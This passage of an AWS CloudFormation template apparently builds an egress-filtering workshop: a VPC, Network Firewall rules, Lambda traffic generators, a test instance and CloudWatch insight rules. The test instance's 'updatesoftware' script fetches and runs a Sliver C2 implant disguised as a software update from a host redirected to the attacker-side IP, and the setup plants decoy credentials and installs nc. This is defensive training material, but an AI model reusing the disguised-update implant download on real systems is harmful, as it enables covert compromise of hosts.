              'https://mirrors.fedoraproject.org',
              'https://github.com',
              'https://stackoverflow.com',
              'https://ecs.us-west-2.amazonaws.com/',
              'https://amazon.com',
              'https://iam.amazonaws.com',
              'https://docker.com',
              'https://pypi.org',
              'https://npmjs.com',
              'https://fleet.linuxserver.io/',
              'https://salesforce.com',
              'https://redshift.us-west-2.amazonaws.com',
              'https://sts.us-west-2.amazonaws.com',
              'https://slack.com',
              'https://www.partnerapi.com/',
              'https://atlassian.com',
              'https://redhat.com',
              'https://sns.us-west-2.amazonaws.com',
              'https://sqs.us-west-2.amazonaws.com',
              'https://dynamodb.us-west-2.amazonaws.com',
              'https://d2lzkl7pfhq30w.cloudfront.net',
              'https://pypi.python.org',
              'https://splunk.com'
          ]

          def fetch_url(url):
              try:
                  with urllib.request.urlopen(url, timeout=3) as response:
                      return {'url': url, 'status': response.getcode(), 'success': True}
              except Exception as e:
                  return {'url': url, 'status': str(e), 'success': False}

          def check_sites():
              # Randomize the order of websites
              sites = WEBSITES.copy()
              random.shuffle(sites)
              with concurrent.futures.ThreadPoolExecutor() as executor:
                  results = list(executor.map(fetch_url, sites))
              return results

          def handler(event, context):
              results = check_sites()
              successful_requests = sum(1 for r in results if r['success'])
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'timestamp': int(time.time()),
                      'total_sites': len(WEBSITES),
                      'successful_requests': successful_requests,
                      'results': results
                  })
              }
      Runtime: python3.12
      Timeout: 30
      MemorySize: 128
      VpcConfig:
        SecurityGroupIds:
          - !Ref SubnetSecurityGroup
        SubnetIds:
          - !Ref PrivateSubnet5

# Retrieve VpceId Lambda Custom Resource:
  RetrieveVpcIdLogGroup:
    Type: AWS::Logs::LogGroup
    Properties:
        LogGroupName: !Sub "/EgressWorkshop/Lambda/RetrieveVpceId-${AWS::Region}"
        RetentionInDays: 1

  RetrieveVpceId:
    Type: AWS::Lambda::Function
    DependsOn: RetrieveVpcIdLogGroup
    Properties:
      FunctionName: !Sub "Fw-RetrieveVpceId-${AWS::StackName}"
      Handler: "index.handler"
      Role: !GetAtt
        - LambdaExecutionRole
        - Arn
      Code:
        ZipFile: |
          import boto3
          import cfnresponse
          import json
          import logging

          def handler(event, context):
              logger = logging.getLogger()
              logger.setLevel(logging.INFO)
              responseData = {}
              responseStatus = cfnresponse.FAILED
              logger.info('Received event: {}'.format(json.dumps(event)))
              if event["RequestType"] == "Delete":
                  responseStatus = cfnresponse.SUCCESS
                  cfnresponse.send(event, context, responseStatus, responseData)
              if event["RequestType"] == "Create":
                  try:
                      Az1 = event["ResourceProperties"]["Az1"]
                      FwArn = event["ResourceProperties"]["FwArn"]
                  except Exception as e:
                      logger.info('AZ retrieval failure: {}'.format(e))
                  try:
                      nfw = boto3.client('network-firewall')
                  except Exception as e:
                      logger.info('boto3.client failure: {}'.format(e))
                  try:
                      NfwResponse=nfw.describe_firewall(FirewallArn=FwArn)
                      VpceId1 = NfwResponse['FirewallStatus']['SyncStates'][Az1]['Attachment']['EndpointId']

                  except Exception as e:
                      logger.info('ec2.describe_firewall failure: {}'.format(e))

                  responseData['FwVpceId1'] = VpceId1
                  responseStatus = cfnresponse.SUCCESS
                  cfnresponse.send(event, context, responseStatus, responseData)
      Runtime: python3.12
      Timeout: 30

  FirewallVpceIds:
    Type: Custom::DescribeVpcEndpoints
    Properties:
      ServiceToken: !GetAtt RetrieveVpceId.Arn
      Az1: 
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      FwArn: !Ref EgressVPCFirewall

# Testing Security Group:
  SubnetSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "Full acess from 10.0.0.0/8"
      GroupName: "EgressVPC-TestInstance-Sg1"
      VpcId: !Ref EgressVPC
      SecurityGroupIngress:
        - IpProtocol: '-1'
          CidrIp: 10.0.0.0/8
          FromPort: -1
          ToPort: -1   
      Tags:
        - Key: Name
          Value: "EgressVPC-TestInstance-Sg1"
  
      
# AWS Network Firewall:
  # Inspection Firewall Rule Groups:
  DomainAllowStatefulRuleGroup:
    Type: 'AWS::NetworkFirewall::RuleGroup'
    Properties:
      RuleGroupName: EgressWorkshop-DomainAllow-RuleGroup
      Type: STATEFUL
      Capacity: 100
      RuleGroup:
        StatefulRuleOptions:
          RuleOrder: "STRICT_ORDER"
        RuleVariables: {}
        RulesSource:
          RulesSourceList:
            TargetTypes:
              - HTTP_HOST
              - TLS_SNI
            Targets:
              - ".amazon.com"
              - ".amazonaws.com"
            GeneratedRulesType: "ALLOWLIST"
      Tags:
        - Key: Name
          Value: EgressWorkshop-DomainAllow-RuleGroup

  #Suricata rule to allow TLS Inspection and SNI Spoofing
  TLSInspectionRuleGroup:
    Type: AWS::NetworkFirewall::RuleGroup
    Properties:
      RuleGroupName: !Sub TLS-Inspection-rule-${AWS::StackName}
      Type: STATEFUL
      Capacity: 100
      Description: Suricata rule to allow fake SNI traffic
      RuleGroup:
        StatefulRuleOptions:
          RuleOrder: "STRICT_ORDER"
        RulesSource:
          RulesString: |
            alert tls $HOME_NET any -> $EXTERNAL_NET any (tls.sni; content:"checkip.amazonaws.com"; startswith; nocase; endswith; flow:to_server; msg:"TLS SNI Allowed"; sid:202315893;)
            pass tls $HOME_NET any -> $EXTERNAL_NET any (tls.sni; content:"checkip.amazonaws.com"; startswith; nocase; endswith; flow:to_server; msg:"pass rules do not alert/log"; sid:202315873;)
      

  #Egress Firewall Policy:
  EgressFirewallPolicy:
    DependsOn: DomainAllowStatefulRuleGroup
    Type: AWS::NetworkFirewall::FirewallPolicy
    Properties:
      FirewallPolicyName: EgressWorkshop-InspectionFirewall-Policy
      FirewallPolicy:
        StatelessDefaultActions:
          - 'aws:forward_to_sfe'
        StatelessFragmentDefaultActions:
          - 'aws:forward_to_sfe'
        StatefulEngineOptions:
          RuleOrder: "STRICT_ORDER"
        StatefulDefaultActions:
          - 'aws:alert_established'

          
      Tags:
        - Key: Name
          Value: EgressWorkshop-InspectionFirewall-Policy

  #Egress Firewall:
  EgressVPCFirewall:
    DependsOn: DomainAllowStatefulRuleGroup
    Type: AWS::NetworkFirewall::Firewall
    Properties:
      FirewallName: EgressWorkshop-InspectionFirewall
      FirewallPolicyArn: !Ref EgressFirewallPolicy
      VpcId: !Ref EgressVPC
      SubnetMappings:
        - SubnetId: !Ref FirewallSubnet1
      Tags:
        - Key: Name
          Value: EgressWorkshop-InspectionFirewall  

  #Egress Firewall Logging:
  EgressVPCFirewallLogFlowGroup:
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/EgressWorkshop/Anfw/Flow"

  EgressVPCFirewallLogAlertGroup:
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/EgressWorkshop/Anfw/Alert"

  EgressVPCFirewallLog:
    Type: AWS::NetworkFirewall::LoggingConfiguration
    Properties:
      FirewallArn: !Ref EgressVPCFirewall
      LoggingConfiguration:
        LogDestinationConfigs:
          - LogType: FLOW
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: !Ref EgressVPCFirewallLogFlowGroup
          - LogType: ALERT
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: !Ref EgressVPCFirewallLogAlertGroup

# Private Route Tables:
  PrivateRtb1:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
        - Key: Name
          Value: EgressVPC-PrivateRouteTable1

  PrivateRtb1Association1:   # Renamed original for clarity
      Type: AWS::EC2::SubnetRouteTableAssociation
      Properties:
        RouteTableId: !Ref PrivateRtb1
        SubnetId: !Ref PrivateSubnet1

  PrivateRtb1Association2:
      Type: AWS::EC2::SubnetRouteTableAssociation
      Properties:
        RouteTableId: !Ref PrivateRtb1
        SubnetId: !Ref PrivateSubnet2

  PrivateRtb1Association3:
      Type: AWS::EC2::SubnetRouteTableAssociation
      Properties:
        RouteTableId: !Ref PrivateRtb1
        SubnetId: !Ref PrivateSubnet3

  PrivateRtb1Association4:
      Type: AWS::EC2::SubnetRouteTableAssociation
      Properties:
        RouteTableId: !Ref PrivateRtb1
        SubnetId: !Ref PrivateSubnet4

  PrivateRtb1Association5:
      Type: AWS::EC2::SubnetRouteTableAssociation
      Properties:
        RouteTableId: !Ref PrivateRtb1
        SubnetId: !Ref PrivateSubnet5



#  PrivateRtb1DefaultRoute:
#    Type: AWS::EC2::Route
#    Properties:
#      DestinationCidrBlock: "0.0.0.0/0"
#      NatGatewayId: !Ref NatGw1
#      RouteTableId: !Ref PrivateRtb1

  PrivateRtb1DefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: EgressVPCFirewall
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
      RouteTableId: !Ref PrivateRtb1

# Public Route Tables:
  PublicRtb1:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
        - Key: Name
          Value: EgressVPC-PublicRouteTable1

  PublicRtb1Association:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref PublicRtb1
      SubnetId: !Ref PublicSubnet1

  PublicRtb1DefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: EgressGatewayAttachment
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      GatewayId: !Ref EgressInternetGateway
      RouteTableId: !Ref PublicRtb1

  PublicRtb1FwReturn1: # Covers return path to privatesubnet1
    Type: AWS::EC2::Route
    DependsOn: EgressVPCFirewall
    Properties:
      DestinationCidrBlock: "10.1.1.0/24"
      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
      RouteTableId: !Ref PublicRtb1
  PublicRtb1FwReturn2: # Covers return path to privatesubnet2
    Type: AWS::EC2::Route
    DependsOn: EgressVPCFirewall
    Properties:
      DestinationCidrBlock: "10.1.2.0/24"
      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
      RouteTableId: !Ref PublicRtb1
  PublicRtb1FwReturn3: # Covers return path to privatesubnet3
    Type: AWS::EC2::Route
    DependsOn: EgressVPCFirewall
    Properties:
      DestinationCidrBlock: "10.1.3.0/24"
      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
      RouteTableId: !Ref PublicRtb1   
  PublicRtb1FwReturn4: # Covers return path to privatesubnet4
    Type: AWS::EC2::Route
    DependsOn: EgressVPCFirewall
    Properties:
      DestinationCidrBlock: "10.1.4.0/24"
      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
      RouteTableId: !Ref PublicRtb1
  PublicRtb1FwReturn5: # Covers return path to privatesubnet4
    Type: AWS::EC2::Route
    DependsOn: EgressVPCFirewall
    Properties:
      DestinationCidrBlock: "10.1.5.0/24"
      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
      RouteTableId: !Ref PublicRtb1

# Firewall Route Tables:
  FirewallRtb1:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
        - Key: Name
          Value: EgressVPC-FirewallRouteTable1

  FirewallRtb1Association:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref FirewallRtb1
      SubnetId: !Ref FirewallSubnet1

  FirewallRtb1DefaultRoute:
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      NatGatewayId: !Ref NatGw1
      RouteTableId: !Ref FirewallRtb1

# Test Instances - for egress tests: Imports cert to ACM
  TestInstance1:
    Type: AWS::EC2::Instance
    DependsOn:
      - EgressInstance                     # Dependency on the public traffic host to download C2 Implant
      - NatGw1                             # Ensure NAT gateway is created and available
      - EgressGatewayAttachment            # Ensure the internet gateway is attached to the VPC
      - PrivateRtb1DefaultRoute            # Ensure the private route table has the default route through the NAT
      - PublicRtb1FwReturn1                 # Ensure return route for firewall to the public route table
      - EgressVPCFirewall                  # Ensure the firewall is created
      - EgressVPCFirewallLog               # Ensure firewall logging is configured
      - FirewallSubnet1                    # Ensure the firewall subnet is ready
      - FirewallVpceIds                    # Ensure firewall VPC endpoints are available
    Metadata:
      AWS::CloudFormation::Init:
        configSets:
          Scanner_Install:
            - configure_scanner
        configure_scanner:
          commands:
            download:
              cwd: /usr/bin
              command: "wget -O /usr/bin/egress-check.sh https://ws-assets-prod-iad-r-pdx-f3b3f9f1a7d6a3d0.s3.us-west-2.amazonaws.com/503778b9-6dbb-4e0d-9920-e8dbae141f43/egress-check.sh && chmod 755 /usr/bin/egress-check.sh"
              
#            addtargetcmd:
#              env:
#                SCANTARG: !Sub "${EgressIP}"
#              cwd: /usr/bin
#              command: "[ -f /usr/bin/egress-check.sh ] && chmod 755 /usr/bin/egress-check.sh || true"
          files:
            /usr/bin/testegress:
              mode: "000755"
              content: !Sub |
                #!/bin/bash
                #Script to trigger egress-check.sh
                TESTIP=${EgressIP}
                bash /usr/bin/egress-check.sh $TESTIP
            /usr/bin/updatesoftware:
              mode: "000755"
              content: !Sub |
                #!/bin/bash
                #Script to download Sliver implant disguised as a software update
                echo 'DOWNLOADING SOFTWARE UPDATE...'
                cd /tmp
                wget http://softwareupdate.com/softwareupdate
                sudo chmod +x softwareupdate
                sudo ./softwareupdate &
                echo 'SOFTWARE UPDATE COMPLETE!'
            /tmp/credentials.txt:
              mode: "000755"
              content: !Sub |
                # Database creds
                username=admin@57.88.92.104
                password=f$x$@Dfksu&*#$CXyv
            /usr/bin/genwebtraffic:
              mode: "000755"
              content: !Sub |
                #!/bin/bash

                export AWS_DEFAULT_REGION=${AWS::Region}
                echo "Invoking 5 Lambda functions..."
                
                # AWS CLI v1 doesn't use --cli-binary-format flag and handles payload differently
                aws lambda invoke \
                  --function-name ${AWS::StackName}-web-request-lambda-1 \
                  --invocation-type Event \
                  --payload "{}" \
                  /tmp/lambda_response_1.json &
                pids[1]=$!

                aws lambda invoke \
                  --function-name ${AWS::StackName}-web-request-lambda-2 \
                  --invocation-type Event \
                  --payload "{}" \
                  /tmp/lambda_response_2.json &
                pids[2]=$!

                aws lambda invoke \
                  --function-name ${AWS::StackName}-web-request-lambda-3 \
                  --invocation-type Event \
                  --payload "{}" \
                  /tmp/lambda_response_3.json &
                pids[3]=$!

                aws lambda invoke \
                  --function-name ${AWS::StackName}-web-request-lambda-4 \
                  --invocation-type Event \
                  --payload "{}" \
                  /tmp/lambda_response_4.json &
                pids[4]=$!

                aws lambda invoke \
                  --function-name ${AWS::StackName}-web-request-lambda-5 \
                  --invocation-type Event \
                  --payload "{}" \
                  /tmp/lambda_response_5.json &
                pids[5]=$!

                # Wait for all background processes to complete
                for pid in ${!pids[*]}; do
                  wait $pid
                  status=$?
                  if [ $status -eq 0 ]; then
                    echo "Lambda invocation $pid completed successfully"
                  else
                    echo "Lambda invocation $pid failed with status $status"
                  fi
                done
                echo "All Lambda invocations completed"

        
            /usr/bin/testfirewall:
              mode: "000755"
              content: |
                #!/bin/bash
                
                # Allowed sites
                allowed_sites=(
                "aws.amazon.com"
                "github.com/aws-samples/aws-network-firewall-automation-examples"
                "mirrors.fedoraproject.org"
                "github.com"
                "stackoverflow.com"
                "ecs.us-west-2.amazonaws.com"
                "amazon.com"
                "iam.amazonaws.com"
                "docker.com"
                "pypi.org"
                "npmjs.com"
                "fleet.linuxserver.io"
                "salesforce.com"
                "redshift.us-west-2.amazonaws.com"
                "sts.us-west-2.amazonaws.com"
                "slack.com"
                "www.partnerapi.com"
                "atlassian.com"
                "redhat.com"
                "sns.us-west-2.amazonaws.com"
                "sqs.us-west-2.amazonaws.com"
                "dynamodb.us-west-2.amazonaws.com"
                "d2lzkl7pfhq30w.cloudfront.net"
                "pypi.python.org"
                "splunk.com"
                )
        
                # Additional sites that should be blocked
                blocked_sites=(
                  "facebook.com"
                  "twitter.com"
                  "instagram.com"
                  "tiktok.com"
                  "reddit.com"
                  "pinterest.com"
                  "tumblr.com"
                  "snapchat.com"
                  "whatsapp.com"
                  "telegram.org"
                )
        
                echo "Testing allowed sites..."
                for site in "${allowed_sites[@]}"; do
                  if curl -s --connect-timeout 1 --max-time 2 "https://$site" > /dev/null; then
                    printf "\u2705 %s - Accessible (Expected)\n" "$site"
                  else
                    printf "\u274c %s - Not accessible (Unexpected)\n" "$site"
                  fi
                done
        
                echo -e "\nTesting blocked sites..."
                for site in "${blocked_sites[@]}"; do
                  if ! curl -s --connect-timeout 1 --max-time 2  "https://$site" > /dev/null; then
                    printf "\u2705 %s - Blocked (Expected)\n" "$site"
                  else
                    printf "\u274c %s - Accessible (Unexpected)\n" "$site"
                  fi
                done
                     
    Properties:
      ImageId: !Ref LatestAmiId
      SubnetId: !Ref PrivateSubnet1
      InstanceType: t3.micro
      SecurityGroupIds:
        - !Ref SubnetSecurityGroup
      IamInstanceProfile: !Ref EC2InstanceProfile
      Tags:
        - Key: Name
          Value: ProtectedSubnet-TestInstance1
      UserData:
        Fn::Base64: !Sub |
          #!/bin/bash -xe
          retry_count=0
          until yum update -y || [ $retry_count -eq 5 ]; do
            echo "Retrying yum update... Attempt $retry_count"
            retry_count=$((retry_count + 1))
            sleep 10
          done
          # yum install -y https://s3.${AWS::Region}.amazonaws.com/amazon-ssm-${AWS::Region}/latest/linux_amd64/amazon-ssm-agent.rpm
          # systemctl start amazon-ssm-agent
          amazon-linux-extras install epel -y
          yum install knot-utils -y 
          yum install samba-client -y
          yum install nc -y
          yum install ftp -y
          systemctl start sshd
          amazon-linux-extras enable python3
          yum install -y python3 --disablerepo amzn2-core
          yum install -y curl git python-pip
          echo "${EgressIP} testhost.aws" >> /etc/hosts
          echo "${EgressIP} softwareupdate.com" >> /etc/hosts
          wget -O /tmp/flightsim_2.5.1_linux_64-bit.rpm https://github.com/alphasoc/flightsim/releases/download/v2.5.1/flightsim_2.5.1_linux_64-bit.rpm
          yum install -y /tmp/flightsim_2.5.1_linux_64-bit.rpm
          wget -O /tmp/setupcerts.zip https://ws-assets-prod-iad-r-pdx-f3b3f9f1a7d6a3d0.s3.us-west-2.amazonaws.com/503778b9-6dbb-4e0d-9920-e8dbae141f43/setupcerts.zip
          cd /tmp
          unzip setupcerts.zip
          cd setupcerts/
          bash create_certs
          yum install ca-certificates
          update-ca-trust force-enable
          cp /tmp/setupcerts/out-dir/root/ca/certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/
          update-ca-trust extract
          aws acm import-certificate --certificate file:///tmp/setupcerts/out-dir/root/ca/intermediate/certs/intermediate.cert.pem --private-key file:///tmp/setupcerts/out-dir/root/ca/intermediate/private/intermediate.key.pem --certificate-chain file:///tmp/setupcerts/out-dir/root/ca/intermediate/certs/ca-chain.cert.pem --region us-west-2 --tags Key=name,Value=tls-inspection-certificate

          # Download sliver implant
          cd /tmp
          # wget http://${EgressIP}/softwareupdate

          /usr/bin/aws configure set region ${AWS::Region}
          /opt/aws/bin/cfn-init -v --stack ${AWS::StackName} --resource TestInstance1 --configsets Scanner_Install --region ${AWS::Region}
          /opt/aws/bin/cfn-signal -e $? --stack ${AWS::StackName} --resource TestInstance1 --region ${AWS::Region}
    CreationPolicy:
      ResourceSignal:
        Timeout: PT30M


# CloudWatch Dashboard Resources
  ##### Custom Resource #####

  # Lambda Function Converts Subnet List to String for Substition in PrivateLink Metric Search Expressions
  GenerateSubnetQueryStringFunction:
    Type: AWS::Lambda::Function
    Properties:
      Handler: index.lambda_handler
      Role: !GetAtt  GenerateSubnetQueryStringFunctionRole.Arn
      Runtime: python3.9
      Code:
        ZipFile: |
          import cfnresponse
          import logging
          import json

          logger = logging.getLogger()
          logger.setLevel(logging.INFO)

          def lambda_handler(event, context):
              logger.info(f"Got event\n{json.dumps(event, indent=4, sort_keys=False)}")
              responseData = {}
              subnet_id = event['ResourceProperties']['FirewallSubnetList']

              try:
                  logger.info(f'Incoming RequestType: {event["RequestType"]}')

                  # send success signal on delete
                  if event['RequestType'] == "Delete":
                      cfnresponse.send(event, context, cfnresponse.SUCCESS, {})

                  if event['RequestType'] in ["Create", "Update"]:
                      responseData = {}
                      subnet_query_string = f'\\"Subnet Id\\"=\\"{subnet_id}\\"'
                      logger.info(subnet_query_string)
                      responseData['SubnetQueryString'] = subnet_query_string
                      cfnresponse.send(event, context, cfnresponse.SUCCESS, responseData)
              except Exception as err:
                  error_msg = str(err)
                  logger.warning(error_msg)
                  responseData = {"Data": error_msg}
                  cfnresponse.send(event, context, cfnresponse.FAILED, responseData)
                  raise err
              return

  #Custom Resource For Subnet List to String
  GenerateSubnetQueryStringCustomResource:
    Type: AWS::CloudFormation::CustomResource
    Properties:
      ServiceToken: !GetAtt GenerateSubnetQueryStringFunction.Arn
      FirewallSubnetList: !Ref FirewallSubnet1

  #Role Allowing Lambda to Publish Log Events to CloudWatch
  GenerateSubnetQueryStringFunctionRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Statement:
        - Effect: Allow
          Principal:
            Service: lambda.amazonaws.com
          Action: sts:AssumeRole
      Path: /
      Policies:
        - PolicyName: CustomLambdaPolicy
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogGroup
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: arn:aws:logs:*:*:*

  ##### Contributor Insights Rules #####

  # Contributor Insights Rule - Top Long-Lived TCP Flows - Age > 350 Seconds
  TopLongLivedTCPFlowsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.netflow.age",
              "GreaterThan": 350
            },
            {
              "Match": "$.event.proto",
              "In": [
                  "TCP"
              ]
            }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.src_port",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallFlowLogGroupName}"
            ]
        }
      RuleName: !Sub TopLongLivedTCPFlowsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - TCP SYN Without SYN-ACK
  TopTCPSYNWithoutSYNACKRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.tcp.tcp_flags",
              "In": [
              "02"
            ]
            }],
            "Keys": [
              "$.event.src_ip",
              "$.event.src_port",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallFlowLogGroupName}"
            ]
        }
      RuleName: !Sub TopTCPSYNWithoutSYNACKRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top Source IP by Packets
  TopSourceIPByPacketsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.src_ip"
            ],
            "ValueOf": "$.event.netflow.pkts"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopSourceIPByPacketsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState
  
  # Contributor Insights Rule - Top Source IP by Bytes
  TopSourceIPByBytesRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.src_ip"
            ],
            "ValueOf": "$.event.netflow.bytes"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopSourceIPByBytesRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top Destination IP by Packets
  TopDestinationIPByPacketsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.dest_ip"
            ],
            "ValueOf": "$.event.netflow.pkts"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopDestinationIPByPacketsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top Destination IP by Bytes
  TopDestinationIPByBytesRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.dest_ip"
            ],
            "ValueOf": "$.event.netflow.bytes"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopDestinationIPByBytesRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top Source and Destination IP by Packets
  TopSourceAndDestinationIPByPacketsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip"
            ],
            "ValueOf": "$.event.netflow.pkts"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopSourceAndDestinationIPByPacketsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top Source and Destination IP by Bytes
  TopSourceAndDestinationIPByBytesRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Sum",
            "Contribution": {
              "Filters": [],
              "Keys": [
                "$.event.src_ip",
                "$.event.dest_ip"
              ],
              "ValueOf": "$.event.netflow.bytes"
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallFlowLogGroupName}"
            ]
        }
      RuleName: !Sub TopSourceAndDestinationIPByBytesRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState
  
  # Contributor Insights Rule - Top Source Ports
  TopSourcePortsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.src_port"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopSourcePortsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState 

  # Contributor Insights Rule - Top Destination Ports
  TopDestinationPortsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.dest_port"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopDestinationPortsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top TCP Flows
  TopTCPFlowsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.proto",
              "In": [
              "TCP"
            ]
            }],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallFlowLogGroupName}"
            ]
        }
      RuleName: !Sub TopTCPFlowsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState
                    
  # Contributor Insights Rule - Top TCP Flows by Packets
  TopTCPFlowsByPacketsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.proto",
                "In": [
                  "TCP"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ],
            "ValueOf": "$.event.netflow.pkts"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopTCPFlowsByPacketsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState
  
  # Contributor Insights Rule - Top TCP Flows by Bytes
  TopTCPFlowsByBytesRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.proto",
                "In": [
                  "TCP"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ],
            "ValueOf": "$.event.netflow.bytes"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
